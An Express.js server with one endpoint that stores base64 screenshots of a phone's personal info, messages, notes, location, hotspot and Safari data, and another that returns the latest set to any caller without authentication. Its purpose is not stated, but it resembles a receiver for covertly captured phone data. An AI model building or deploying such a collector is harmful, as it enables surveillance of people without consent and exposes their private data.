const express = require('express');
const app = express();

// Increased limit to 50mb to handle up to 7 base64 screenshots
app.use(express.json({ limit: '50mb' }));

let latestSubmission = {
    personal_info_b64: null,
    phone_number_b64: null,
    notes_b64: null,
    messages_b64: null,
    hotspot_b64: null,
    location_b64: null,
    safari_b64: null,
    timestamp: null
};

app.post('/api/submit', (req, res) => {
    try {
        const {
            personal_info_b64,
            phone_number_b64,
            notes_b64,
            notes,
            messages_b64,
            messages,
            hotspot_b64,
            hotspot,
            location_b64,
            location,
            safari_b64,
            safari
        } = req.body;

        // Resolve aliases for flexible key naming
        const resolvedNotes = notes_b64 || notes;
        const resolvedMessages = messages_b64 || messages;
        const resolvedHotspot = hotspot_b64 || hotspot;
        const resolvedLocation = location_b64 || location;
        const resolvedSafari = safari_b64 || safari;

        if (
            !personal_info_b64 ||
            !phone_number_b64 ||
            !resolvedNotes ||
            !resolvedMessages ||
            !resolvedHotspot ||
            !resolvedLocation ||
            !resolvedSafari
        ) {
            return res.status(400).json({
                success: false,
                error: 'Missing one or more required fields'
            });
        }

        latestSubmission = {
            personal_info_b64,
            phone_number_b64,
            notes_b64: resolvedNotes,
            messages_b64: resolvedMessages,
            hotspot_b64: resolvedHotspot,
            location_b64: resolvedLocation,
            safari_b64: resolvedSafari,
            timestamp: Date.now()
        };

        return res.status(200).json({ success: true, message: 'Stored!' });
    } catch (error) {
        return res.status(500).json({ success: false, error: 'Server error' });
    }
});

app.get('/api/latest', (req, res) => {
    if (!latestSubmission.personal_info_b64) {
        return res.status(404).json({ success: false, error: 'No data yet' });
    }
    return res.status(200).json({
        success: true,
        personal_info_b64: latestSubmission.personal_info_b64,
        phone_number_b64: latestSubmission.phone_number_b64,
        notes_b64: latestSubmission.notes_b64,
        messages_b64: latestSubmission.messages_b64,
        hotspot_b64: latestSubmission.hotspot_b64,
        location_b64: latestSubmission.location_b64,
        safari_b64: latestSubmission.safari_b64,
        timestamp: latestSubmission.timestamp
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
